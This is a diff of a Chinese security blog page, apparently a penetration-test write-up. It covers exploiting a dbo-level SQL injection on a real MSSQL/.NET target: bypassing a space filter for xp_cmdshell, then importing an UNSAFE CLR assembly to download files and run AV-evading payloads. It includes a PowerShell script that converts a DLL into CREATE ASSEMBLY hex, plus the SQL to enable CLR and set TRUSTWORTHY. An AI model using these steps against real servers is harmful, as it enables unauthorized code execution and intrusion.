@@ -395,21 +395,21 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h1 id="渗透技巧之特殊环境的mssql思路"><a href="#渗透技巧之特殊环境的mssql思路" class="headerlink" title="渗透技巧之特殊环境的mssql思路"></a>渗透技巧之特殊环境的mssql思路</h1><h5 id="图片来源真实环境，目前取得都是历史保留"><a href="#图片来源真实环境，目前取得都是历史保留" class="headerlink" title="图片来源真实环境，目前取得都是历史保留"></a>图片来源真实环境，目前取得都是历史保留</h5><p>某次实战项目中，在一个.NET的站点发现了一个dbo权限的注入，但是这次遇到的数据库和windows版本都很高，本次记录下渗透过程中遇到的问题和解决方法<img src="/.io//image-20200219094347949.png" alt="image-20200219094347949"></p>
+        <h1 id="渗透技巧之特殊环境的mssql思路"><a href="#渗透技巧之特殊环境的mssql思路" class="headerlink" title="渗透技巧之特殊环境的mssql思路"></a>渗透技巧之特殊环境的mssql思路</h1><h5 id="图片来源真实环境，目前取得都是历史保留"><a href="#图片来源真实环境，目前取得都是历史保留" class="headerlink" title="图片来源真实环境，目前取得都是历史保留"></a>图片来源真实环境，目前取得都是历史保留</h5><p>某次实战项目中，在一个.NET的站点发现了一个dbo权限的注入，但是这次遇到的数据库和windows版本都很高，本次记录下渗透过程中遇到的问题和解决方法<img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219094347949.png" alt="image-20200219094347949"></p>
 <p>有了注入点，接下来就是查询三连，查询用户权限，查询版本信息，查询当前数据库</p>
-<p><img src="/.io//image-20200219095042968.png" alt="image-20200219095042968"></p>
+<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219095042968.png" alt="image-20200219095042968"></p>
 <p>dbo权限，开启xp_cmdshell发现有过滤，过滤了空格和%0a，这里用存储过程来绕过这个过滤</p>
-<p><img src="/.io//image-20200219095932280.png" alt="image-20200219095932280"></p>
-<p><img src="/.io//image-20200219100409650.png" alt="image-20200219100409650"></p>
+<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219095932280.png" alt="image-20200219095932280"></p>
+<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219100409650.png" alt="image-20200219100409650"></p>
 <p>开启之后，检查一下，先创建一个表，将xp_cmdshell的执行结果插入表中，然后用报错注入查询数据</p>
-<p><img src="/.io//image-20200219103432987.png" alt="image-20200219103432987"></p>
-<p><img src="/.io//image-20200219103534721.png" alt="image-20200219103534721"></p>
+<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219103432987.png" alt="image-20200219103432987"></p>
+<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219103534721.png" alt="image-20200219103534721"></p>
 <p>目标能成功执行命令，执行ping命令，看是否能出网，这里需要注意下，执行命令的时候可以用提取环境变量的字符替换空格</p>
-<p><img src="/.io//image-20200219143206079.png" alt="image-20200219143206079"></p>
-<p><img src="/.io//image-20200219143315287.png" alt="image-20200219143315287"></p>
+<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219143206079.png" alt="image-20200219143206079"></p>
+<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219143315287.png" alt="image-20200219143315287"></p>
 <p>目标执行下载命令无结果，后续尝试了<strong>certutil</strong>，<strong>bitsadmin</strong>，都报错了，写入vbs后，vbs拒绝访问，命令行下载失败，转回mssql，使用mssql的功能帮助我们下载文件</p>
-<p><img src="/.io//image-20200219143628981.png" alt="image-20200219143628981"></p>
-<p><img src="/.io//image-20200219143640607.png" alt="image-20200219143640607"></p>
+<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219143628981.png" alt="image-20200219143628981"></p>
+<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219143640607.png" alt="image-20200219143640607"></p>
 <p>解决这个问题可以使用CLR执行</p>
 <p>Common Language Runtime(CLR)程序集定义为可以导入SQL Server的.NET DLL（或DLL组）。导入后，DLL方法可以链接到存储过程并通过TSQL执行。创建和导入自定义CLR程序集的能力是开发人员扩展SQL Server本机功能的好方法，但自然也为攻击者创造了机会。</p>
 <p>首先，需要先生成下载文件的dll，代码如下</p>
@@ -418,25 +418,25 @@ height:50vh;
 <p>然后需要将生成的dll转成hex，使用powershell脚本进行转换</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$assemblyFile &#x3D; &quot;C:\Users\Administrator\Downloads\63nmap\63\ClassLibrary1.dll&quot;&#x2F;&#x2F;生成的dll</span><br><span class="line">$stringBuilder &#x3D; New-Object -Type System.Text.StringBuilder </span><br><span class="line">$stringBuilder.Append(&quot;CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM &#96;n0x&quot;) | Out-Null</span><br><span class="line">$fileStream &#x3D; [IO.File]::OpenRead($assemblyFile)</span><br><span class="line">while (($byte &#x3D; $fileStream.ReadByte()) -gt -1) &#123;</span><br><span class="line"> $stringBuilder.Append($byte.ToString(&quot;X2&quot;)) | Out-Null</span><br><span class="line">&#125;</span><br><span class="line">$stringBuilder.AppendLine(&quot;&#96;nWITH PERMISSION_SET &#x3D; UNSAFE&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;GO&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot; &quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;CREATE PROCEDURE [dbo].[clr_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME </span><br><span class="line">[my_assembly].[StoredProcedures].[clr_exec];&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;GO&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot; &quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;EXEC[dbo].[clr_exec] &#39;whoami&#39;&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;GO&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot; &quot;) | Out-Null</span><br><span class="line">$stringBuilder.ToString() -join &quot;&quot; | Out-File C:\Users\Administrator\Downloads\63nmap\63\exec.txt&#x2F;&#x2F;生成的16进制</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.io//image-20200219143933477.png" alt="image-20200219143933477"></p>
+<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219143933477.png" alt="image-20200219143933477"></p>
 <p>开启CLR，这里使用存储过程执行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#39;show advanced options&#39;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line">-- Enable clr on the server</span><br><span class="line">sp_configure &#39;clr enabled&#39;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.io//image-20200219144843568.png" alt="image-20200219144843568"></p>
+<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219144843568.png" alt="image-20200219144843568"></p>
 <p>需要设置数据库拥有者为sa，这个方法不能使用master数据库来执行查询语句，这里使用存储过程执行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alter database [数据库名] set TRUSTWORTHY on</span><br><span class="line">EXEC sp_changedbowner &#39;sa&#39;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.io//image-20200219144907747.png" alt="image-20200219144907747"></p>
+<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219144907747.png" alt="image-20200219144907747"></p>
 <p>创建一个名为sysinfo的存储过程，创建执行存储过程的函数，这里创建存储过程不能使用存储过程执行，而且不能一起执行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create assembly sysinfo from 0x4D5A90000300000004000000FFFF0000B8000000000000004000000000000000000000000000000000000000000000000*****</span><br><span class="line">with permission_set&#x3D;unsafe;</span><br><span class="line">create procedure sysinfo_run_proc(@proc nvarchar(max),@arg nvarchar(max)) as external name sysinfo.[Hi.Test.SQLClr].RunProc;</span><br><span class="line">create function sysinfo_run(@proc nvarchar(max),@arg nvarchar(max)) returns nvarchar(max) as external name sysinfo.[Hi.Test.SQLClr].Run;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.io//image-20200219145231308.png" alt="image-20200219145231308"></p>
-<p><img src="/.io//image-20200219145251817.png" alt="image-20200219145251817"></p>
+<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219145231308.png" alt="image-20200219145231308"></p>
+<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219145251817.png" alt="image-20200219145251817"></p>
 <p>使用创建好的函数执行下载程序</p>
-<p><img src="/.io//image-20200219145437748.png" alt="image-20200219145437748"></p>
+<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219145437748.png" alt="image-20200219145437748"></p>
 <p>使用xp_cmdshell查看是否下载成功</p>
-<p><img src="/.io//image-20200219145920748.png" alt="image-20200219145920748"></p>
-<p><img src="/.io//image-20200219145945274.png" alt="image-20200219145945274"></p>
+<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219145920748.png" alt="image-20200219145920748"></p>
+<p><img src="/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/image-20200219145945274.png" alt="image-20200219145945274"></p>
 <p>CLR可以将免杀的程序进行不落地执行，但是，如果免杀不太懂，还是建议创建一个能稳定下载的函数，这样可以便于团队的合作，将上线的操作交给熟悉免杀的队员</p>
 
     </article>
@@ -627,16 +627,6 @@ top:50vh;
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 6
@@ -649,6 +639,35 @@ top:50vh;
     
     
     
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/16</span><a class="archive-post-title" href= "/2020/03/16/DolphinPHP%20%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" >DolphinPHP 全版本后台代码执行漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2020/03/10/ysoserial%E4%B9%8B%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89payload/" >ysoserial之添加自定义payload</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/09</span><a class="archive-post-title" href= "/2020/03/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" >反序列化学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/09</span><a class="archive-post-title" href= "/2020/03/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%86%E6%9E%90ysoserial/" >反序列化学习之分析ysoserial</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
     
     <div class="archive-year"> Invalid date </div>
     <ul class="year-list">
@@ -669,27 +688,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/16</span><a class="archive-post-title" href= "/2020/03/16/DolphinPHP%20%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" >DolphinPHP 全版本后台代码执行漏洞</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2020/03/10/ysoserial%E4%B9%8B%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89payload/" >ysoserial之添加自定义payload</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2020/03/10/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E7%89%B9%E6%AE%8A%E7%8E%AF%E5%A2%83%E7%9A%84mssql%E6%80%9D%E8%B7%AF/" >渗透技巧之特殊环境的mssql思路</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/09</span><a class="archive-post-title" href= "/2020/03/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" >反序列化学习</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/09</span><a class="archive-post-title" href= "/2020/03/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%86%E6%9E%90ysoserial/" >反序列化学习之分析ysoserial</a>
         </li>
     
     </div>
